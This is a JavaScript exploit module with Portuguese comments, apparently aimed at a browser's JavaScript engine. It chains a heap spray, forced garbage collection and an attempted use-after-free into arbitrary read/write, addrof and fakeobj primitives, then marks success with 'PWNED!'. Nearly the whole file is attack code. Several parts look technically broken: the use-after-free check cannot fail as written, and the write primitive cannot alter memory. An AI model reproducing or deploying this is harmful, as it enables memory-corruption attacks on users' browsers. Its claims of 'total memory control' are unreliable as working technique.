// js/script3/testArrayBufferVictimCrash.mjs (Versão Definitiva - Iterativa e Resiliente)

import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64 } from '../utils.mjs';

export const FNAME_MODULE = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R56_Annihilation";

// --- Variáveis Globais e Funções Auxiliares ---
let fake_string; // Nossa string falsa que nos dará poder sobre a memória

// Funções de conversão (sem alterações)
const ftoi = (val) => {
    const buf = new ArrayBuffer(8); (new Float64Array(buf))[0] = val;
    const ints = new Uint32Array(buf); return new AdvancedInt64(ints[0], ints[1]);
};
const itof = (val) => {
    const buf = new ArrayBuffer(8); const ints = new Uint32Array(buf);
    ints[0] = val.low(); ints[1] = val.high();
    return (new Float64Array(buf))[0];
};

// --- Primitivas de Leitura/Escrita Arbitrária ---
// Esta implementação está correta, dependendo de um 'fake_string' funcional.
function arb_read(where) {
    fake_string.container.data_ptr = where;
    let result = new AdvancedInt64(0, 0);
    let bytes = new Uint8Array(8);
    for (let i = 0; i < 8; i++) { bytes[i] = fake_string.charCodeAt(i); }
    let view = new DataView(bytes.buffer);
    result.setLow(view.getUint32(0, true));
    result.setHigh(view.getUint32(4, true));
    return result;
}
function arb_write(where, what) {
    fake_string.container.data_ptr = where;
    let bytes = new Uint8Array(8);
    let view = new DataView(bytes.buffer);
    view.setUint32(0, what.low(), true);
    view.setUint32(4, what.high(), true);
    const new_str = String.fromCharCode.apply(null, bytes);
    fake_string.slice(0, 8).replace(new_str);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL
// =======================================================================================
export async function runExploitChain_Final() {
    logS3(`--- Iniciando ${FNAME_MODULE}: Abordagem Iterativa e Resiliente ---`, "test");
    try {
        logS3("--- FASE 1: Construção da String Falsa via UAF Iterativo ---", "subtest");
        createFakeString_Iterative(); // Chamando a nova função iterativa
        logS3("    Primitivas de R/W Arbitrário via String Falsa construídas com sucesso!", "vuln");

        logS3("--- FASE 2: Construindo e Validando addrof/fakeobj ---", "subtest");
        let victim_array = [{}];
        // Bootstrap do endereço do butterfly usando nossas novas primitivas de R/W
        let bootstrap_addrof = (obj) => {
            fake_string.container.data_ptr = ftoi(obj.a);
            return arb_read(ftoi(obj.a).add(16));
        };
        // O addrof primitivo não é necessário da forma antiga, podemos construir diretamente.
        // Acesso direto ao butterfly do victim_array
        let victim_leaker = {a: victim_array};
        let victim_addr = ftoi(victim_leaker.a);
        let victim_butterfly_addr = arb_read(victim_addr.add(16));

        const addrof = (obj) => {
            victim_array[0] = obj;
            return arb_read(victim_butterfly_addr);
        };
        const fakeobj = (addr) => {
            arb_write(victim_butterfly_addr, addr);
            return victim_array[0];
        };
        logS3("    Primitivas `addrof` e `fakeobj` construídas.", "good");

        const test_obj = { marker: 0xFACEFEED };
        const test_obj_addr = addrof(test_obj);
        logS3(`    Prova de Vida (addrof): Endereço do objeto de teste -> ${test_obj_addr.toString(true)}`, "leak");
        
        const fake_test_obj = fakeobj(test_obj_addr);
        if (fake_test_obj.marker === 0xFACEFEED) {
            logS3(`    SUCESSO! Lemos a propriedade 'marker' do objeto falso. Primitivas validadas!`, "vuln");
        } else {
            throw new Error(`Falha ao validar 'fakeobj'.`);
        }
        document.title = "PWNED!";
        return { success: true, message: "Controle total da memória obtido!" };
    } catch (e) {
        logS3(`A cadeia de exploração falhou: ${e.message}`, "critical");
        console.error(e);
        document.title = "Exploit Failed";
        return { success: false, errorOccurred: e.message };
    }
}

// --- Função UAF Iterativa e Resiliente ---
function createFakeString_Iterative() {
    const MAX_ATTEMPTS = 10;
    for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
        logS3(`    Tentativa de UAF [${attempt}/${MAX_ATTEMPTS}]...`, 'info');
        
        const SPRAY_SIZE = 4096;
        const HOLE_STEP = 16;
        const STRING_SIZE = 128;

        let spray_arr = [];
        for (let i = 0; i < SPRAY_SIZE; i++) {
            spray_arr.push('B'.repeat(STRING_SIZE));
        }

        let dangling_ref = spray_arr[SPRAY_SIZE / 2];

        for (let i = 0; i < SPRAY_SIZE; i += HOLE_STEP) {
            spray_arr[i] = null;
        }

        triggerGC();
        
        let container = {
            jscell_header: new AdvancedInt64(0x01082007, 0x00000000),
            string_length: 0x7fffffff,
            data_ptr: new AdvancedInt64(0, 0)
        };

        let reclaimers = [];
        for (let i = 0; i < SPRAY_SIZE; i++) {
            reclaimers.push(container);
        }
        
        // VERIFICAÇÃO DEFINITIVA COM TRY...CATCH
        try {
            // Se 'dangling_ref' ainda for uma string, esta linha vai falhar e gerar um erro.
            dangling_ref.container = container;

            // Se chegamos aqui, o UAF FUNCIONOU! A propriedade foi adicionada.
            logS3(`    SUCESSO na tentativa ${attempt}! Confusão de tipos estabelecida.`, "good");
            fake_string = dangling_ref;
            return; // Sai da função com sucesso.
        } catch (e) {
            // O UAF falhou nesta tentativa, o erro foi capturado. O loop continuará.
            if (attempt === MAX_ATTEMPTS) {
                // Se todas as tentativas falharem, lançamos o erro final.
                throw new Error("UAF falhou após todas as tentativas. O alocador de memória resistiu.");
            }
        }
    }
}

function triggerGC() {
    try {
        for (let i = 0; i < 128; i++) { new ArrayBuffer(1024 * 1024 * 8); }
    } catch (e) {}
}

// Adicionando propriedade ao protótipo para ajudar no bootstrap inicial
Object.prototype.a = {};
